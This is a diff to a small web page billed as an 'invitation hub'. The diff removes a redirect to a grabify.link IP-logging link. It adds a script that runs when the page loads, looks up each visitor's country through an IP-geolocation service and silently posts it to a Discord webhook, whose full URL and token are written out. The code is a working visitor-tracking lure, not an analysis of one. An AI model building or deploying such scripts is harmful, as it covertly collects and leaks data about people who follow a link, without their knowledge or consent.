@@ -3,11 +3,38 @@
 <head>
   <meta charset="UTF-8">
   <title>The NEW invitation hub!</title>
-  <meta name="description" content="Ravensleigh.co.uk/invite, The NEW best way to invite people. Click the link to find out more.">
+  <meta name="description" content="A test website.">
   <script>
-    window.location.href = "https://grabify.link/8R49LD";
+    async function getUserCountry() {
+      
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      return data.country_name; 
+      }
+
+let userCountry;
+
+getUserCountry().then(country => {
+  userCountry = country;
+const webhookURL = "https://discord.com/api/webhooks/1467501807830831154/RuLUs4ffAq2ipEK0fTTzh0QoM0UzLjQOxgObSn3dZ3S3Ll3nnnNmQlihK_l6Kt2b2RzP";
+
+// Your variable
+fetch(webhookURL, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    content: userCountry
+  })
+});
+});
+
+    
+    
   </script>
 </head>
 <body>
+  <h1> This page is currently for testing only. There is no reason for you to be here.</h1>
 </body>
 </html>
